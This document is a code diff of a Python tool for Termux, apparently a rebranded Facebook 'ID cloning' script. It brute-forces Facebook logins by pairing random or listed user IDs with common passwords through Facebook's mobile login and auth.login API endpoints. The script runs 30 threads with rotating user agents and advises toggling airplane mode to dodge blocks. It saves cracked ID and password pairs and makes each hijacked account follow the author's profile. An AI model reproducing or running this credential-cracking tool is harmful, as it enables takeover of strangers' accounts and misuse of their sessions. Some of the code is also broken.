@@ -1,22 +1,33 @@
-W = '\000[97;1m'
-R = '\000[91;1m'
-G = '\000[92;1m'
-Y = '\000[93;1m'
-B = '\000[94;1m'
-P = '\000[95;1m'
-C = '\000[96;1m'
+##   ClonerIT   :       Facebook ID'Z Cloning Tool
+##   Author     :       OHAN Pvt. Ltd.
+##   Developer  :       Md. Nabid Ul Islam
+##   Visit      :       https://somirgc.com/THAN  Find us    :
+##   Facebook   :    https://facebook.com/somirgc.it
+##   WebSite    :    https://somirgc.com/OHAN
+##
+##   Copyright  :    OHAN Pvt. Ltd. (https://somirgc.com/OHAN) 2022.
+
+W = '\033[97;1m'
+R = '\033[91;1m'
+G = '\033[92;1m'
+Y = '\033[93;1m'
+B = '\033[94;1m'
+M = '\033[35;1m'
+P = '\033[95;1m'
+C = '\033[96;1m'
 N = '\x1b[0m'
+
 import os
 try:
 	import requests
 except ImportError:
 	os.system("pip install requests")
-
+ 
 try:
 	import concurrent.futures
 except ImportError:
 	os.system("pip install futures")
-
+ 
 import os
 import sys
 import time
@@ -61,12 +72,12 @@ try:
 except:pass
 # COLORS
 x = '\33[m' 
-k = '\000[93m' 
+k = '\033[93m' 
 h = '\x1b[1;92m' 
-hh = '\000[32m' 
-u = '\000[95m' 
-K = '\000[95m' 
-kk = '\000[33m' 
+hh = '\033[32m' 
+u = '\033[95m' 
+K = '\033[95m' 
+kk = '\033[33m' 
 b = '\33[1;96m' 
 p = '\x1b[0;34m' 
 # Converter 
@@ -83,15 +94,15 @@ def clear():
 # BACK
 def back():
 	login()
-
-TALHA="OHAN-"
-imt="-Busra4786=="
-ak="Lover-"
+ 
+Mrdevil="mrd-"
+imt="-brand=="
+ak="-pro"
 myid=uuid.uuid4().hex[:10].upper()
 try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.mrOHAN-cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'r').read()
 except:
-	kok=open('/data/data/com.termux/files/usr/bin/.mrOHAN-cov', 'w')
+	kok=open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'w')
 	kok.write(myid+imt)
 	kok.close()
 def login():
@@ -114,7 +125,7 @@ def jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 ############### #LOGO############## ## 
-
+ 
 # LOGIN
 def Public():
 	clear()
@@ -174,19 +185,19 @@ def File():
 			clear()
 			print(logo)
 			try:
-				fileX = input ('\n [+] Enter file path : ') 
+				fileX = input ('\n [+] FILE NAME : ') 
 				for line in open(fileX, 'r').readlines():
 					id.append(line.strip())
 				setting()
 			except IOError:
 				exit("\n [!] file %s not found"%(fileX))
-
+ 
 def setting():
 	hu = ("2")
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
-
+ 
 	elif hu in ['2','02']:
 		muda=[]
 		for bacot in sorted(id):
@@ -204,8 +215,8 @@ def setting():
 		print (' [!] Choose Correct Option')
 		exit()
 	clear()
-	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \000[1;97m')
-	hc = input ("\n [#] method : ")
+	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 [BEST] \033[1;97m')
+	hc = input ("\n [+] Method : ")
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['2','02']:
@@ -228,7 +239,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( ' [!] \000[1;96mTurn Airplane Mode On/Off Every 5 Minutes\000[1;0m\n')
+	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -255,7 +266,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \000[1;92mOK/%s\000[1;97m\n [] CP Result Saved To : \000[1;91mCP/%s\000[1;97m\n [!] \000[1;96mTurn Airplane Mode On/Off Every 5 Minutes\000[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			try:
@@ -275,7 +286,7 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \000[1;92mOK/%s\000[1;97m\n [] CP Result Saved To : \000[1;91mCP/%s\000[1;97m\n [!] \000[1;96mTurn Airplane Mode On/Off Every 5 Minutes\000[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -309,7 +320,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ OHAN ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[CRACK] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,20 +335,20 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ OHAN-CP ] {idf} | {pw}')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				print( f'\r\x1b[1;91m[OHAN-CP] {idf} * {pw}')
+				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b [ OHAN-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;91m [OHAN-CP] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
+				open('/sdcard/OHAN-CP.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
-
+ 
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
@@ -348,7 +359,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ OHAN ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[CRACK] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -362,20 +373,20 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ OHAN-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;92m [Successfull-OHAN] {idf} * {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ OHAN-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [Successfull-OHAN] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/OHAN-OK','a').write('%s\n' % wrt)
+				open('/sdcard/Successfull-OHAN','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
-
+ 
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
@@ -383,25 +394,25 @@ def free(idf,pwv):
 	loop+=1
 def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=1000679452619', cookies={'cookie': coki}).text, 'html.parser')
+	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
-logo = ("""\000
-################################################################################                                                                          ####                                                                          ####  ########    ########     ##       ##    ##       ##    #####    ######  ####  #      #    #      #     ##       ##    ##       ##     # #     ##      ####  #      #    #      #     ##       ##    ##       ##     # #     ##      ####  #######     #      #     ## #     ##    ## #     ##     # #     ######  ####  #      #    #      #     ##   #   ##    ##   #   ##     # #     ##      ####  #      #    #      #     ##     # ##    ##     # ##     # #     ##      ####  #      #    ########     ##      ###    ##      ###    #####    ######  ####                                                                          ####            FB: PAUL     GitHub: OhanRonnie    Version: 1.0               ####                                                                          ################################################################################
-________________________________________×____________________________________
-  
-  Owner   :. OHAN RONNIE
-
-  Github  :  Ohan Ronnie
-
-  Facebook : PAUL
-  
-  Youtube :   ERROR 404
-  
-  Contact :  NOT AVAILABLE
-________________________________________×____________________________________\000""")
-
+logo = """
+ ################################################################################                                                                          ####                                                                          ####  ########    ########     ##       ##    ##       ##    #####    ######  ####  #      #    #      #     ##       ##    ##       ##     # #     ##      ####  #      #    #      #     ##       ##    ##       ##     # #     ##      ####  #######     #      #     ## #     ##    ## #     ##     # #     ######  ####  #      #    #      #     ##   #   ##    ##   #   ##     # #     ##      ####  #      #    #      #     ##     # ##    ##     # ##     # #     ##      ####  #      #    ########     ##      ###    ##      ###    #####    ######  ####                                                                          ####            FB: PAUL     GitHub: OhanRonnie    Version: 1.0               ####                                                                          ################################################################################
+ ________________________________________×____________________________________
+   
+   Owner   :. OHAN RONNIE
+ 
+   Github  :  Ohan Ronnie
+ 
+   Facebook : PAUL
+   
+   Youtube :   ERROR 404
+   
+   Contact :  NOT AVAILABLE
+ ________________________________________×____________________________________
+"""
 class Main:
 	def __init__(self):
 		self.id = []
@@ -410,61 +421,89 @@ class Main:
 		self.loop = 0
 		os.system("clear")
 		print(logo)
-		print("\n[1] FOLLOW ME")
-		print("[2] 2011 - 2014 CLONE")
-		print("[3] FILE CLONE")
-		print("[4] PUBLIC CLONE  -- [GOOD] ")
-		print("[5] CREATE FILE ")
-		print("[E] EXIT \n")
-		TALHA =input(" Choose : ")
-		if TALHA in ["3", "03"]:
+		print(" \033[1;37m[✓] Select Menu \n")
+		print(" \033[1;37m[1] Menu")
+		print(" \033[1;37m[0] Exit")
+		print("")
+		Baloch = input(" \n\033[1;37m [-] Select an Option : \033[36m")
+		if Baloch in ["", " "]:
+			exit()
+		elif Baloch in ["0", "00"]:
+			print("\n \33[1;42m\033[1;97m Thank you for Using this Tool. Have a Good Day. \33[0m\n")
+			exit()
+		elif Baloch in ["1", "01"]:
+			os.system("xdg-open https://www.facebook.com/imdnabidui")
+			print("")
+			time.sleep(3.0)
+			print("\033[92;1m [√] Checking Approval...")
+			print("")
+			input("\n\033[1;37m [-] Type Follow Account Name : \033[36m")
+			time.sleep(3.1)
+			print("")
+			print("\033[1;32m [√] You have Successfully Logged in.")
+			time.sleep(3.0)
+			os.system("clear")
+		print(logo)
+		print(" [✓] Select Menu \n")
+		print(" [1] File Cloning")
+		print(" [2] Public Cloning")
+		print(" [3] Random Cloning")
+		print(" [4] 2006 TO 2012")
+		print(" [5] 2004 TO 2008")
+		print(" [9] Main Menu \n")
+		UZAIR =input(" \n [-] Select an Option : \033[36m")
+		if UZAIR in ["1", "01"]:
 			File()
-		if TALHA in ["4", "04"]:
+		if UZAIR in ["2", "02"]:
 			Public()
-		if TALHA in ["5", "05"]:
-			os.system("python Dump.py")
-		if TALHA in ["1", "01"]:
+		if UZAIR in ["3", "03"]:
+			os.system("python2 mrd1.py")
+		if UZAIR in ["4", "04"]:
 			self.old()
-		if TALHA in ["2", "02"]:
+		if UZAIR in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
-			print (" Select Correctly ")
+			print ("\033[92;1m [<] Returning to Main Menu...")
 			time.sleep(1)
 			Main()
-
+ 
 	def old(self):
 		x = 111111111
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\235[+]\235 TOTAL IDS TO CRACK LIMIT 50,000:\235 "))
+		limit = int(input("\033[93;1m [+] TOTAL ID'Z TO CRACK LIMIT 50,000 : \033[36m"))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
 			
-			print("\000[+] TOTAL ID ->\000"%(len(self.id))) 
+			print("\033[93;1m [+] TOTAL ID : \033[1;32m%s\033[1;32m"%(len(self.id)))
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\000[!] USE (123456) FOR IDZ\000")
-				listpass = input(" [?] ENTER PASSWORD : "%(G,Y))
+				print("\n\033[93;1m [+] EXAMPLE (123456,12345678) FOR OLD ID'Z\033[1;37m ")
+				listpass = input("\033[93;1m%s [+] ENTER PASSWORD : %s\033[36m"%(Y,R))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> \000"%(G,listpass))
+					exit("\n\033[0;91%s [!] PASSWORD MINIMUM 6 DIGIT...\n"%(R))
+				print("\n\033[93;1m [+] CHECK WITH PASSWORD : \033[1;32m%s\033[1;32m"%(listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s [+] VISIT MYPROFILE AnD FOLOw ME "%(Y))
-				print("%s [+] CLONE STARTED"%(G))
-				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
+				print("\033[93;1m [+] WAIT A WHILE FOR ID'Z CLONING\n")
+				print("\033[93;1m [+] CLONING STARTED")
+				print("\033[93;1m [+] 70% CP ACCOUNT OPEN JUST NOW")
+				print("\033[93;1m [+] IF NO RESULTS USE AIRPLANE MODE ON FOR 10 SEC")
+				print("\033[93;1m [+] NOTE : USE ONLY MOBILE DATA")
+				print("\033[97;1m ---------------------------------------------------\n")
+				print("\033[97;1m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n [>>] CRACK COMPLETE...")
+			exit("\n\n \033[97;1m[√] PROCESS COMPLETE... \n\033[0;92m \n [•] Thank you for Using this Tool. Have a Good Day.\n")
 		except Exception as e:exit(str(e))
-
+ 
 	def api(self, uid, pwx):
 		rua = random.choice([
-			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
+		"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 			  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
@@ -828,7 +867,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ OHAN ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]>%s/[CRACK]: %s > [OK]: %s > [CP]: %s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -843,52 +882,56 @@ class Main:
 				"content-type": "application/x-www-form-urlencoded", 
 				"x-fb-http-engine": "Liger"
 			}
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \000[ OHAN-OK ] %s | %s\000    "%(uid, pw))
-				print ("\r \000[0;92m Congrats Bro ")
+				print("\r \000[+] [OK-OHAN]%s | %s\000        "%(uid, pw))
+				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-OHAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("Successfull.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \053[ OHAN-CP ] %s | %s\053      "%(uid, pw))
+				print("\r \033[1;32m[✓] [OK-OHAN] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-OHAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
-
+ 
 		self.loop +=1
-
+ 
 	def old2(self):
 		x = 1111111111
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \000[+]\000TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input("\033[93;1m [+] TOTAL ID'Z TO CRACK LIMIT 50,000 : \033[36m"))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
 			
-			print("\000[[+] TOTAL ID -> \000%s\000"%(len(self.id))) 
+			print("\033[93;1m [+] TOTAL ID : \033[1;32m%s\033[1;32m"%(len(self.id)))
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\000[!] USE (123456) FOR IDZ\000")
-				listpass = input(" [?] ENTER PASSWORD : "%(G,Y))
+				print("\n\033[93;1m [+] EXAMPLE (123456,12345678) FOR OLD ID'Z\033[1;37m ")
+				listpass = input("\033[93;1m%s [+] ENTER PASSWORD : %s\033[36m"%(Y,R))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> [\000%s\000"%(G,listpass))
+					exit("\n\033[91;1m%s [+] PASSWORD MINIMUM 6 DIGIT...\n"%(R))
+				print("\n\033[93;1m [+] CHECK WITH PASSWORD : \033[1;32m%s\033[1;32m"%(listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
-				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
-				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
+				print("\033[93;1m [+] WAIT A WHILE FOR ID'Z CLONING\n")
+				print("\033[93;1m [+] CLONING STARTED")
+				print("\033[93;1m [+] 70% CP ACCOUNT OPEN JUST NOW")
+				print("\033[93;1m [+] IF NO RESULTS USE AIRPLANE MODE ON FOR 10 SEC")
+				print("\033[93;1m [+] NOTE : USE ONLY MOBILE DATA")
+				print("\033[97;1m ---------------------------------------------------\n")
+				print("\033[97;1m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n [>>] CRACK COMPLETE...")
+			exit("\n\n \033[97;1m[√] PROCESS COMPLETE... \n\033[0;92m \n [•] Thank you for Using this Tool. Have a Good Day.\n")
 		except Exception as e:exit(str(e))
-
+ 
 	def api(self, uid, pwx):
 		rua = random.choice([
 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
@@ -1253,9 +1296,9 @@ class Main:
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
-		])
+	])
 		sys.stdout.write(
-			"\r [ OHAN ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]>%s/[CRACK]: %s >[OK]: %s >[CP]: %s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1270,55 +1313,31 @@ class Main:
 				"content-type": "application/x-www-form-urlencoded", 
 				"x-fb-http-engine": "Liger"
 			}
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \000[ OHAN-OK ] %s | %s\000        "%(uid, pw))
-				print ("\r \000[ Congrats Bro ")
+				print("\r \000[+] [CP-OHAN] %s | %s\000         "%(uid, pw))
+				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-OHAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("Successfull.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \000 OHAN-OK ] %s | %s\000 "%(uid, pw))
+				print("\r \033[1;32m[✓] [OK-OHAN] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-OHAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
-
+ 
 		self.loop +=1
-
-
-def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrOHAN-cov', 'r').read()
-	clear()
-	print(logo)
-	r1=requests.get("https://pastebin.com/p3jbWM14").text
-	if key1 in r1:
-		os.system('clear')
-		print(logo)
-		Main()
+ 
+if len(sys.argv) == 2:
+	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
+		helpnote()
 	else:
-		os.system("clear")
-		print(logo)
-		print("\t \000[1;32m First Get Approvel\000[1;37m ")
-		time.sleep(1)
-		os.system("clear")
-		print(logo)
-		print ("")
-		print(" \000[1;32m OHAN  Toll Paid You Need Get Approved First\000[1;37m\n")
-		print(" \000[1;32m Note : Paid Tolls Free  HA JANI LOG \000[1;37m")
-		print ("")
-		print(" Your Key is Not Approved ")
-		print("")
-		print(" Copy And Send Key To Admin")
-		print ("")
-		print (" Your Key : "+ak+Talha+key1)
-		print ("")
-		name = input(" Your Name : ")
-		print ("")
-		input(" Press Enter To Send Key")
-		time.sleep(3.5)
-		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Talha+''+key1
-		os.system('am start https://wa.me/+8801304002896?text=' + tks)
-		Subscraption()        
-Main()
+		Main()
+ 
+try:Main()
+except Exception as e:exit(str(e))
+ 
+
+	
